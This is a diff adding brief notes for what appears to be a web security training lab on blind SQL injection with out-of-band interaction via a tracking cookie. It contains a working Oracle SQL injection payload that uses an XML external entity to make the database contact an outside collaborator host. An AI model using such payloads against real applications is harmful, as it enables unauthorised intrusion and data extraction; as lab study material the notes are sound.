@@ -1,0 +1,11 @@
+ab #15 - Blind SQL injection with out-of-band interaction
+
+Vulnerable parameter - Tracking cookie
+
+End Goal - Exploit SQLi and cause a DNS lookup
+
+Analysis:
+
+yz11r9rmp478x5niizqv8pla016rug.oastify.com
+
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://yz11r9rmp478x5niizqv8pla016rug.oastify.com"> %remote;]>'),'/l') FROM dual)--
